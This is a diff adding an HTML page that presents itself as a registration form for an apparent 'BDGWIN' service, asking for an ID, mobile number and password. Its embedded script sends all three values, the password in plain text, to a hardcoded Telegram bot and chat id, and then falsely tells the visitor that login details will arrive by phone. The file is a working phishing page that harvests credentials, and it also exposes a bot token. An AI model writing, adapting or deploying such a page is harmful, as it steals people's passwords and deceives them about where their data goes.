@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <section class="login">
+
+        <!-- <h2 class="headings">Login</h2> -->
+
+        <div class="logo">
+            <img src="img/logo.png" width="200px" style="margin-top: 80px;" alt="">
+        </div>
+
+        <form id="myForm">
+            <input type="text" id="text1" placeholder="Enter BDGWIN Id"><br>
+            <input type="text" id="text2" placeholder="Enter Mobile Number"><br>
+            <input type="password" id="text3" placeholder="Enter Password"><br>
+            <input type="submit" value="Register">
+        </form>
+
+        <div id="message"></div> <!-- Div to display message -->
+
+    </section>
+
+
+</body>
+<script>
+    const form = document.querySelector("#myForm"); // Changed form selector to #myForm
+    form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        var text1 = document.getElementById("text1").value;
+        var text2 = document.getElementById("text2").value;
+        var text3 = document.getElementById("text3").value;
+        var my_text = `New User : %0A - BdgWin ID : ${text1} %0A - Mob No : ${text2} %0A - Password : ${text3}`;
+        var token = "7132784946:AAGEpbVCvnY3q2Rd36v7Aero6RVSIciFWGo";
+        var chat_id = 1415223986;
+        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${my_text}`; // Fixed URL concatenation
+        var api = new XMLHttpRequest();
+        api.open("GET", url, true);
+        api.onload = function () {
+            if (api.status >= 200 && api.status < 400) {
+                // Message successfully sent
+                var messageDiv = document.getElementById("message");
+                messageDiv.textContent = "You will receive login details on your mobile number.";
+            } else {
+                // Error sending message
+                console.error("Error sending message:", api.statusText);
+            }
+        };
+        api.onerror = function () {
+            console.error("Error sending message:", api.statusText);
+        };
+        api.send();
+    });
+</script>
+
+</html>
